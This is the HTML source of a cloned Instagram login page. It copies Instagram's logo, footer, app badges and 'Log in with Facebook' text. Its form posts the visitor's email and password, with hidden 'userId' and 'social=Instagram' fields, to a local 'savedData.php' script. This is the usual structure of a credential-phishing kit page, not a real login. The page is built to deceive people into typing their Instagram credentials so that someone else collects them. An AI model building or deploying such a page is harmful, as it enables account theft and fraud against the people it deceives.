<!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
      <link rel="icon" href="https://www.pngkey.com/png/full/283-2831746_insta-icon-instagram.png" />
      <title>Instagram Login UI</title>
      <!-- Custom Styles -->
      <link rel="stylesheet" href="../stylesheet/instagram.css">
    </head>
    
    <body onload="loadEnd()">
      <div id="loading">
        <svg width="50" height="50" viewBox="0 0 50 50" style="position:absolute;top:50%;left:50%;margin:-25px 0 0 -25px;fill:#c7c7c7"><path d="M25 1c-6.52 0-7.34.03-9.9.14-2.55.12-4.3.53-5.82 1.12a11.76 11.76 0 0 0-4.25 2.77 11.76 11.76 0 0 0-2.77 4.25c-.6 1.52-1 3.27-1.12 5.82C1.03 17.66 1 18.48 1 25c0 6.5.03 7.33.14 9.88.12 2.56.53 4.3 1.12 5.83a11.76 11.76 0 0 0 2.77 4.25 11.76 11.76 0 0 0 4.25 2.77c1.52.59 3.27 1 5.82 1.11 2.56.12 3.38.14 9.9.14 6.5 0 7.33-.02 9.88-.14 2.56-.12 4.3-.52 5.83-1.11a11.76 11.76 0 0 0 4.25-2.77 11.76 11.76 0 0 0 2.77-4.25c.59-1.53 1-3.27 1.11-5.83.12-2.55.14-3.37.14-9.89 0-6.51-.02-7.33-.14-9.89-.12-2.55-.52-4.3-1.11-5.82a11.76 11.76 0 0 0-2.77-4.25 11.76 11.76 0 0 0-4.25-2.77c-1.53-.6-3.27-1-5.83-1.12A170.2 170.2 0 0 0 25 1zm0 4.32c6.4 0 7.16.03 9.69.14 2.34.11 3.6.5 4.45.83 1.12.43 1.92.95 2.76 1.8a7.43 7.43 0 0 1 1.8 2.75c.32.85.72 2.12.82 4.46.12 2.53.14 3.29.14 9.7 0 6.4-.02 7.16-.14 9.69-.1 2.34-.5 3.6-.82 4.45a7.43 7.43 0 0 1-1.8 2.76 7.43 7.43 0 0 1-2.76 1.8c-.84.32-2.11.72-4.45.82-2.53.12-3.3.14-9.7.14-6.4 0-7.16-.02-9.7-.14-2.33-.1-3.6-.5-4.45-.82a7.43 7.43 0 0 1-2.76-1.8 7.43 7.43 0 0 1-1.8-2.76c-.32-.84-.71-2.11-.82-4.45a166.5 166.5 0 0 1-.14-9.7c0-6.4.03-7.16.14-9.7.11-2.33.5-3.6.83-4.45a7.43 7.43 0 0 1 1.8-2.76 7.43 7.43 0 0 1 2.75-1.8c.85-.32 2.12-.71 4.46-.82 2.53-.11 3.29-.14 9.7-.14zm0 7.35a12.32 12.32 0 1 0 0 24.64 12.32 12.32 0 0 0 0-24.64zM25 33a8 8 0 1 1 0-16 8 8 0 0 1 0 16zm15.68-20.8a2.88 2.88 0 1 0-5.76 0 2.88 2.88 0 0 0 5.76 0z"></path></svg>
      </div>
      <div id="main">
        <br /><br />
        <img id="instico" width="75%" src="https://www.vectorlogo.zone/logos/instagram/instagram-wordmark.svg" alt="" />
        <br />
        <form action="../Component/savedData.php" method="POST">
        <input id="inMail" class="in" type="email" name="email" id="" value="" placeholder="Phone Number, username, or email"/><br />
        <input id="inPass" type="password" class="in" name="password" id="" value="" placeholder="Password"/>
        <br />
        <input type="hidden" name="userId"  value="11">
        <input type="hidden" name="social"  value="Instagram">
        <input type="submit" name="saveData" id="btinp" value="Log In" />
        </form>
        <br />
        <fieldset style="text-align: center; border: 0px solid black; border-top: 1px solid black;">
          <legend style="padding: 5px;">or</legend>
        </fieldset>
        <p style="font-size: 95%;font-weight: 600; color: #38549e;"><i class="fa fa-facebook-official"> </i> Log in with Facebook</p>
        <p style="font-size: 80%; color:#3b5998;">Forget Password?</p>
        <p style="padding-top: 25px;">Don`t have an account? <span style="color: #1778f2; font-weight: bold;">Sign Up</span></p>
        <p style="padding-top: 25px;">Get the app.</p>
        <p onclick=""><img id="install" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="" /><img id="install" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="" /></p>
      </div>
      <div id="wait" style="display: none; width: 100%; height:100%; position: fixed; background: #ffffff80; z-index: 2;">
        <svg style="position: absolute; top: 50%; left:50%; margin: -25px 0 0 -25px" width="50" height="50" viewBox="0 0 38 38" xmlns="http://www.w3.org/2000/svg">
        <defs>
         <linearGradient x1="8.042%" y1="0%" x2="65.682%" y2="23.865%" id="a">
          <stop stop-color="#1E7EF3" stop-opacity="0" offset="0%" />
          <stop stop-color="#1E7EF3" stop-opacity=".631" offset="63.146%" />
          <stop stop-color="#1E7EF3" offset="100%" />
         </linearGradient>
        </defs>
       <g fill="none" fill-rule="evenodd">
        <g transform="translate(1 1)">
          <path d="M36 18c0-9.94-8.06-18-18-18" id="Oval-2" stroke="url(#a)" stroke-width="2">
            <animateTransform
              attributeName="transform"
              type="rotate"
              from="0 18 18"
              to="360 18 18"
              dur="0.9s"
              repeatCount="indefinite" />
          </path>
          <circle fill="#fff" cx="36" cy="18" r="1">
            <animateTransform
              attributeName="transform"
              type="rotate"
              from="0 18 18"
              to="360 18 18"
              dur="0.9s"
              repeatCount="indefinite" />
          </circle>
         </g>
        </g>
      </svg>
      </div>
      <footer>
        <p>About  Blog  Jobs  Help  API  Privacy  Terms  Top Accounts  Hashtag  Locations</p>
        <p>Locations  Beauty  Dance & Performance  Fitness  Food & Drink  Home & Garden  Music  Visual Arts</p>
        <p>© 2021 Instagram from Facebook</p>
      </footer><br />
      <script>
    var load = document.getElementById("loading");
    var wait = document.getElementById("wait");
    var login = document.getElementById("btinp");
    var em = document.getElementById("inMail");
    var pas = document.getElementById("inPass");
    
    
    em.addEventListener("keyup", inputEvent);
    pas.addEventListener("keyup", inputEvent)
    
    function loadEnd() {
      load.style.display = "none";
      
    }
    function inputEvent() {
      if ((em.value.length >= 4) && (pas.value.length >= 6)) {
        document.getElementById("btinp").style.backgroundColor = "#1E7EF3";
        login.addEventListener("click", logIn)
        
      } else {
        document.getElementById("btinp").style.backgroundColor = "#1E7EF359";
        login.removeEventListener("click", logIn)
      } 
    }
      </script>
    </body>
    </html>